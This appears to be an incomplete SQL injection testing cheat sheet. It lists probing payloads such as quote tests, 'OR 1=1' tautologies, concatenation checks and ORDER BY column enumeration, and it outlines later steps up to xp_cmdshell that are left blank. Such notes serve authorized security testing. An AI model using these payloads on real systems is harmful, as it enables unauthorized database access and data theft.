STEPS
——————————————————————————————————————————————————————
1) Find if Vulnerable
2) Enumerate columns
3) Identify user and database
4) Find tables and columns
5) Find stored data
6) Check if user is admin or if he has privileges
7) Check if you can get xp_cmdshell
——————————————————————————————————————————————————————

One of the first steps you have to do when probing for SLQi is to identify if a parameter is vulnerable to SQLi.

1) Probe all parameters with 
	1. ‘
	2. “
	3. 

If you get an error then the specific parameter has a SQL vulnerability.
——————————————————————————————————————————————————————

2) Find the type of the parameter and launch attacks to identify true and false state.

	•	Numerical
	⁃	id=1 OR 1=1- -					Provide bad input like id=1 AND 1=2- - and see output
	⁃	id=1+1
	⁃	id=67-ASCII(‘A’) 
	⁃	id=51-ASCII(1)		Output is 2 if the App returns the same result as id=2 then it is vulnerable to SQLi

	•	String
	⁃	1’ OR ‘1’=‘1 (or with ‘’ or no quotes)
	⁃	passwd’
	⁃	‘ or ‘a’=‘a
	⁃	String Concatenation (If the App returns the same result as a valid command then it is vulnerable to SQLi)
	⁃	Oracle ‘||’foo
	⁃	MySQL ‘ ‘foo
	⁃	Ms-SQL ‘+’foo

	•	Query Structure (if user supplied data is being inserted into the structure of the SQL query rather than an item of data, exploiting SQLi involves supplying valid SQL)
	⁃	ORDER BY 1,2..
	⁃	1 ASC- -, 1 DESC- -

Example : If you find a parameter prone to SQLi Query then try:
	.php?id=1 ORDER BY 1
	.php?id=1 ORDER BY 2
	.php?id=1 ORDER BY 3
	…
	.php?id=1 ORDER BY 6

Until you get an error. When you get you will have found the number of columns in the table.

You can also use URL Encoding

	•	& — %26
	•	+ — %2b 
	•	= — %3d
	•	space — %20
	•	; — %3b

——————————————————————————————————————————————————————
3) Try to identify the database - To find exactly the commands that can run on it

	•	MySQL
	•	MSSQL - SQL Server
	•	Oracle
	•	SQLite
	•	PostgreSQL
——————————————————————————————————————————————————————

——————————————————————————————————————————————————————

——————————————————————————————————————————————————————

——————————————————————————————————————————————————————